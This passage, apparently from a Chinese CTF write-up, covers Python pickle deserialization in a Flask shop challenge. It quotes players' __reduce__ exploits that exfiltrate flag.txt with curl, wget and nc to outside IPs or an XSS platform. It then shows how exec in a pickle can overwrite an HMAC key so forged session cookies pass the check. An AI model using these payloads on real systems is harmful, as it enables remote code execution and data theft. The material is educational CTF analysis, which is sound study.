        def __reduce__(self):
            return (eval,("__import__('os').system('curl -d @flag.txt 174.0.157.204:2333')",))
    a = A()
    print(base64.b64encode(pickle.dumps(a)))
直接上传了flag.txt
ch4ser师傅的：
    import os
    class test(object):
        def __reduce__(self):
            return (os.system,("wget 'http://xss.buuoj.cn/index.php?do=api&id=Krwr7k' --post-data='location='`cat flag.txt` -O-",))
这里用到了buuctf的xss平台。
ice-cream师傅的：
    import pickle
    import base64
    import os
    class A(object):
        def __reduce__(self):
               return (os.system,('nc 174.0.166.111 2333    
提供了可接受反弹的内网靶机，可以注册一个小号去开一个靶机接受信息。
总结一下几位师傅的exp都用到了系统命令执行以及信息外带，假如目标环境只能在web端口向外界提供信息或限制了系统命令执行，有没有办法呢，经过一天的研究，我发现是有办法的，下面来介绍解法二。
# 解法二：覆盖key并伪造cookie
在介绍解法二之前，先提一个问题，假如py脚本中已经定义了一个变量key，而反序列化的pickle流中包含了给key赋值的操作，那么反序列化后key的值会被覆盖吗，我们来验证一下：
    import pickle
    key = b'11111111111111111111111111111111'
    class A(object):
        def __reduce__(self):
            return (exec,("key=b'66666666666666666666666666666666'",))
    a = A()
    pickle_a = pickle.dumps(a)
    print(pickle_a)
    pickle.loads(pickle_a)
    print(key)
输出：
    b"\x80\x03cbuiltins\nexec\nq\x00X'\x00\x00\x00key=b'66666666666666666666666666666666'q\x01\x85q\x02Rq\x03."
    b'66666666666666666666666666666666'
可见key的值被成功覆盖了！来看本题的源码，情况是类似的，同样也定义了key，  
用该key去给cookie做了签名，也存在反序列化数据可控，
    @application.route("/buy", methods=["POST"])
    def buy():
        cookies = request.cookies.get("session")
        if not cookies:
            cookies = {"money": 500, "history": []}
        else:
            cookies = pickle.loads(base64.b64decode(cookies)) #这里可以利用反序列化覆盖key
            digest = cookies["anti_tamper_hmac"]
            del cookies["anti_tamper_hmac"]
            h = hmac.new(key)
            h.update(str(cookies).encode())
            if not hmac.compare_digest(h.digest().hex(), digest):
                cookies = {"money": 500, "history": []}
        assert "id" in request.form
        cookie_id = int(request.form["id"])
        if all_cookies[cookie_id]["price"]   
上面对pickle栈的演示更加形象。